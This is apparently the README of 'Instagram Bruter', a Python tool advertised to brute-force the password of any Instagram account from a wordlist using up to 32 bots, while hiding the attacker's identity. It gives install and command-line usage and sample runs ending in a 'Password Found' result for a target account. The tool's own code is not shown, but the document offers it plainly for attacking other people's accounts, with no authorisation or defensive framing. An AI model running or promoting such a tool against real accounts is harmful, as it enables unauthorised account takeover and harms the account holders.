# Instagram Bruter

[![Version](https://img.shields.io/badge/Version-v2.1.1-blue)]()
[![Python](https://img.shields.io/badge/Python-v3.6%2B-blue)]()
[![Discord](https://img.shields.io/badge/Discord-server-blue)](https://discord.gg/C6AFrWQ)
[![Donate](https://img.shields.io/badge/PayPal-donate-orange)](https://www.paypal.me/Msheikh03)

This program will brute force any Instagram account you send it its way. Just give it a target, a password list and a mode then press enter and forget about it. No need to worry about anonymity when using this program, its highest priority is your anonymity, it only attacks when your identity is hidden.


### Requirements

-   Python _v3.x.x_

### Install Dependencies

```
pip3 install -r requirements.txt
```

### Help

```
C:\Users\Mohamed\Desktop\Instagram>python3 instagram.py -h
usage: instagram.py [-h] [-m MODE] username wordlist

positional arguments:
  username              email or username
  wordlist              password list

optional arguments:
  -h, --help            show this help message and exit
  -m MODE, --mode MODE  modes: 0 => 32 bots; 1 => 16 bots; 2 => 8 bots; 3 => 4 bots
```

### Usage

```
python3 instagram.py <username> <wordlist> -m <mode>
```

### Run

```
[-] Wordlist: passwords.txt
[-] Username: cyberpredators
[-] Password: 452
[-] Complete: 45.51%
[-] Attempts: 228
[-] Browsers: 273
[-] Exists: True
```

### Stop

```
[-] Wordlist: pass.lst
[-] Username: cyberpredators
[-] Password: cyber234xuse
[-] Complete: 62.67%
[-] Attempts: 314
[-] Browsers: 185
[-] Exists: True

[!] Password Found
[+] Username: cyberpredators
[+] Password: cyber234xuse
```
